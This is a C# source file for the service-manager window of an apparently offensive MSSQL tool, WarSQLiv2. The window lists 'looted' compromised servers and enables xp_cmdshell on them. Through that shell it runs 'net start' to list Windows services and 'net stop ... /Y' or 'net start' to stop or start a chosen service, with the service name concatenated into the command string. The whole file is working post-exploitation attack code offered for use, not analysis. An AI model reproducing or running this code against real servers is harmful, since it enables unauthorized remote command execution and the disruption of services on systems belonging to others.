using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmServiceManager.xaml
    /// </summary>
    public partial class FrmServiceManager : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmServiceManager()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    btnGet.Content = _languageControl.SelectedLanguage.GetString("ButtonShow");
                    Title = _languageControl.SelectedLanguage.GetString("TitleServiceManager");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void btnGet_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            lstServiceList.Items.Clear();
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                try
                {
                    Dispatcher.BeginInvoke((Action)delegate
                    {
                        lstServiceList.Items.Clear();
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.ExploitCode = "USE [master]\r\n";
                        _postExploitation.ExploitCode += "EXEC xp_cmdshell '\"net start\"';\r\n";
                        _postExploitation.ShowProgramList();
                        for (int i = 0; i < _postExploitation._programList.Count; i++)
                        {
                            lstServiceList.Items.Add(_postExploitation._programList[i].Replace("   ", "").Replace("  ", "").Replace("\r","").Replace("\n",""));
                        }
                        txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageExploitTask2"));
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
        }
        private void MenuItemStop_Click(object sender, RoutedEventArgs e)
        {
            if (lstServiceList.SelectedIndex > -1)
            {
                var result = MessageBox.Show(_languageControl.SelectedLanguage.GetString("MessageService3"), @"WarSQLiv2", MessageBoxButton.YesNo);
                if (result == MessageBoxResult.Yes)
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitTask5")}");
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        var srvCommand = "USE [master]\r\n";
                        srvCommand += "EXEC xp_cmdshell '\"net stop \"" + lstServiceList.SelectedItem.ToString().Trim() + "\" /Y\"';\r\n";
                        _postExploitation.ExploitCode = srvCommand;
                        _postExploitation.ShowProgramList();
                        var success = _postExploitation._programList.Count;
                        if (success == 4)
                        {
                            foreach (var t in _postExploitation._programList)
                            {
                                txtStatus.AppendText(Environment.NewLine + t.Replace("   ", "").Replace("  ", ""));
                            }
                        }
                        if (success > 4)
                        {
                            foreach (var t in _postExploitation._programList)
                            {
                                txtStatus.AppendText(Environment.NewLine + t.Replace("   ", "").Replace("  ", ""));
                            }
                        }

                    });
                }
            }
        }
        private void MenuItemStart_Click(object sender, RoutedEventArgs e)
        {
            if (lstServiceList.SelectedIndex > -1)
            {
                MessageBoxResult result = MessageBox.Show(_languageControl.SelectedLanguage.GetString("MessageService3"), @"WarSQLiv2", MessageBoxButton.YesNo);
                if (result == MessageBoxResult.Yes)
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitTask5")}");
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        var srvCommand = "USE [master]\r\n";
                        srvCommand += "EXEC xp_cmdshell '\"net start \"" + lstServiceList.SelectedItem.ToString().Trim() + "\" /Y\"';\r\n";
                        _postExploitation.ExploitCode = srvCommand;
                        _postExploitation.ShowProgramList();
                        var success = _postExploitation._programList.Count;
                        if (success == 4)
                        {
                            foreach (var t in _postExploitation._programList)
                            {
                                txtStatus.AppendText(Environment.NewLine + t.Replace("   ", "").Replace("  ", ""));
                            }
                        }
                        if (success > 4)
                        {
                            foreach (var t in _postExploitation._programList)
                            {
                                txtStatus.AppendText(Environment.NewLine + t.Replace("   ", "").Replace("  ", ""));
                            }
                        }

                    });
                }
            }
        }
    }
}
